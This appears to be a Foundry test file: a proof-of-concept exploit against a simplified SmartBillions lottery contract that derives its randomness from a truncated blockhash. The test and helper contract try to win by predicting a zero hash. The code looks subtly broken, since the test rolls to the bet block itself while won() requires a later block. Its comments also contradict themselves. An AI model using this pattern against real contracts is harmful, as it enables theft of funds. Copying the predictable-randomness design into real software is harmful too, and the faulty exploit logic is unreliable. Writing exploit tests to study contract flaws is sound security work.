pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract ExploitTest is Test {
    SmartBillions target;

    receive() external payable {}

    function setUp() public {
        target = new SmartBillions();
        // Fund the contract with some ether to pay out winnings
        vm.deal(address(this), 20 ether);
        (bool sent,) = payable(address(target)).call{value: 10 ether}("");
        require(sent, "funding target failed");

        // Start investment to enable betting if needed
        vm.startPrank(target.owner());
        if (target.investStart() == 0) {
            target.setInvestStart(block.number + 1);
        }
        vm.stopPrank();

        // Invest to get tokens and enable betting
        target.invest{value: 1 ether}(address(0));
    }

    function test_exploit_bad_randomness() public {
        ExploitHelper helper = new ExploitHelper(target);
        vm.deal(address(helper), 1 ether);

        // Place a bet with predicted randomness
        uint betBlock = block.number + 1;

        // Predict betHash (bad randomness) as uint24(uint256(blockhash(betBlock)))
        // We must place the bet in current block, with betBlock set to betBlock
        // The betHash must be predicted from the blockhash of betBlock, which is zero currently
        // So we need to advance to betBlock first, then place the bet with the known blockhash
        // But blockhash of future block is zero, so we exploit that zero is predictable

        // Actually, blockhash of a future block is zero, so betHash = 0 is predictable for future block
        uint24 predictedHash = 0;

        // Place bet at current block, setting betBlock to betBlock (future block)
        helper.placeBet{value: 1 ether}(predictedHash, betBlock);

        // Move to betBlock to resolve bet (simulate mining blocks)
        vm.roll(betBlock);

        uint payoutBefore = address(helper).balance;

        helper.won();

        uint payoutAfter = address(helper).balance;

        assertGt(payoutAfter, payoutBefore, "Exploit failed: no winnings received");

        // Check that bet info matches
        uint betValue = target.betValueOf(address(helper));
        uint betHash = target.betHashOf(address(helper));
        uint betBlockNum = target.betBlockNumberOf(address(helper));

        assertGt(betValue, 0, "Bet value should be > 0");
        assertEq(betHash, predictedHash, "BetHash mismatch");
        assertEq(betBlockNum, betBlock, "Bet block number mismatch");
    }
}

contract ExploitHelper {
    SmartBillions target;

    constructor(SmartBillions _target) {
        target = _target;
    }

    receive() external payable {}

    function placeBet(uint24 betHash, uint betBlockNumber) external payable {
        // Call the target's placeBet function that sets the bet for msg.sender
        bytes memory data = abi.encodeWithSignature("placeBet(uint24,uint256)", betHash, betBlockNumber);
        (bool success,) = address(target).call{value: msg.value}(data);
        require(success, "placeBet failed");
    }

    function won() external {
        target.won();
    }
}

contract SmartBillions {
    struct Bet {
        uint24 betHash;
        uint96 betValue;
        uint32 betBlockNumber;
    }

    mapping(address => Bet) public bets;
    mapping(address => uint) public balances;
    uint public investStart;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        investStart = 1;
    }

    receive() external payable {}

    function setInvestStart(uint _block) external {
        require(msg.sender == owner, "only owner");
        investStart = _block;
    }

    function invest(address) external payable {
        require(investStart != 0 && block.number >= investStart, "not started");
        balances[msg.sender] += msg.value;
    }

    function betValueOf(address _owner) external view returns (uint) {
        return bets[_owner].betValue;
    }

    function betHashOf(address _owner) external view returns (uint) {
        return bets[_owner].betHash;
    }

    function betBlockNumberOf(address _owner) external view returns (uint) {
        return bets[_owner].betBlockNumber;
    }

    function placeBet(uint24 betHash, uint betBlockNumber) external payable {
        require(msg.value > 0, "no bet");
        require(bets[msg.sender].betValue == 0, "already bet");
        require(investStart != 0 && block.number >= investStart, "not started");

        bets[msg.sender] = Bet({
            betHash: betHash,
            betValue: uint96(msg.value),
            betBlockNumber: uint32(betBlockNumber)
        });
    }

    function won() external {
        Bet memory b = bets[msg.sender];
        require(b.betValue > 0, "no bet");
        require(block.number > b.betBlockNumber, "too early");

        uint24 blockHash24 = uint24(uint256(blockhash(b.betBlockNumber)));
        require(blockHash24 == b.betHash, "bad luck");

        uint payout = b.betValue * 2;
        bets[msg.sender].betValue = 0;

        (bool sent,) = msg.sender.call{value: payout}("");
        require(sent, "payout failed");
    }
}

